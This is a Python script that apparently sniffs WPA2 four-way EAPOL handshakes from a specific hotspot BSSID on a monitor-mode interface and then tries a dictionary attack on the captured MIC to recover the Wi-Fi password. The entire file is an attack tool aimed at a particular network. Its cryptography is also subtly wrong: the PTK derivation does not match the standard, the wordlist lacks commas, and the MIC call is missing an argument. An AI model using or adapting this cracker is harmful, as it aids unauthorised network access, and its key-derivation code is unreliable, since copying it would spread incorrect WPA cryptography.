import hashlib
import hmac
from typing import Dict

from core.filters import FilterAggregate, RadioTapHeaderFilter, DataFrameFilter, QoSDataFrameFilter, \
    LogicalLinkControlAuthenticationFilter, AuthenticationKeyTypeFilter, CRC32Filter, DataFrameBssidFilter
from core.frame import EAPOLHandshakeFrame, EAPOLHandshakeNumber
from core.parser import EAPOLHandshakeFrameParser
from core.sniffer import PacketSniffer

from utils.interface import change_channel

# fixme ensure whether sha1 or sha256 should be used for those calculations


def calculate_pmk(psk, ssid):
    # Convert PSK to bytes if necessary
    if isinstance(psk, str):
        psk = psk.encode('utf-8')

    # Convert SSID to bytes if necessary
    if isinstance(ssid, str):
        ssid = ssid.encode('utf-8')

    # Perform PBKDF2 key derivation
    pmk = hashlib.pbkdf2_hmac('sha1', psk, ssid, 4096, 32)

    return pmk


def calculate_ptk(pmk, client_mac, ap_mac, client_nonce, ap_nonce):
    # Step 1: Concatenate the MAC addresses
    macs = client_mac + ap_mac

    # Step 2: Concatenate the Nonces
    nonces = client_nonce + ap_nonce

    # Step 3: Generate keys using HMAC-SHA1
    kck = hmac.new(pmk, b"Pairwise key expansion", hashlib.sha1).digest()
    kek = hmac.new(kck, b"Key encryption", hashlib.sha1).digest()
    tk = hmac.new(kek, b"Temporal Key", hashlib.sha1).digest()
    tsc = hmac.new(tk, b"Transmit Sequence Counter", hashlib.sha1).digest()

    # Step 4: Concatenate the keys
    ptk = macs + nonces + kck + kek + tk + tsc

    return ptk


def calculate_mic(key, data):
    # Generate HMAC-SHA1
    mac = hmac.new(key, data, hashlib.sha1)

    # Get the digest (MIC) as bytes
    mic_bytes = mac.digest()

    return mic_bytes


PASSWORD_WORDLIST = [
    "adminadmin"
    "12345678!"
    "pleaseleavemealone"
]


def crack_password(ssid: str, handshake: Dict[EAPOLHandshakeNumber, EAPOLHandshakeFrame]):

    a_nonce = handshake[EAPOLHandshakeNumber.M1].wpa_key_nonce
    s_nonce = handshake[EAPOLHandshakeNumber.M2].wpa_key_nonce
    a_mac = "".join(handshake[EAPOLHandshakeNumber.M1].src_addr.split(":"))
    s_mac = "".join(handshake[EAPOLHandshakeNumber.M1].dest_addr.split(":"))

    mic4 = handshake[EAPOLHandshakeNumber.M4].key_mic

    print(ssid, a_nonce, s_nonce, a_mac, s_mac, mic4)

    for password in PASSWORD_WORDLIST:
        pmk = calculate_pmk(password, ssid)

        ptk = calculate_ptk(pmk, s_mac, a_mac, s_nonce, a_nonce)

        calculated_mic4 = calculate_mic(ptk, )  # add relevant eapol payload
        if calculated_mic4 == mic4:
            return password


# random mac from android hot spot
bssid = "a2:cf:2d:38:59:0c"
ssid = "Galaxy A31F192"
iface = "wlp4s0mon"
channel = 6

packet_sniffer = PacketSniffer(
    iface,
    EAPOLHandshakeFrameParser(),
    FilterAggregate(
        RadioTapHeaderFilter(),
        CRC32Filter(),
        DataFrameFilter(),
        DataFrameBssidFilter(bssid),
        QoSDataFrameFilter(),
        LogicalLinkControlAuthenticationFilter(),
        AuthenticationKeyTypeFilter()
    )
)

change_channel(iface, channel)

captured_handshakes = {}

for packet in packet_sniffer.listen():
    packet: EAPOLHandshakeFrame

    # HACK - wrong packet parsing
    supplicant_ssid = packet.dest_addr if packet.dest_addr != bssid else packet.bssid
    print(f"Captured {packet.message_number} frame from supplicant {supplicant_ssid}")
    print(packet)

    if supplicant_ssid not in captured_handshakes:
        captured_handshakes[supplicant_ssid] = {}

    captured_handshakes[supplicant_ssid][packet.message_number] = packet

    if len(captured_handshakes[supplicant_ssid]) == 4:
        print(f"Captured 4 packets from {supplicant_ssid}. Starting password cracking.")
        print(f"Found password: {crack_password(ssid, captured_handshakes[supplicant_ssid])}")
        exit(0)

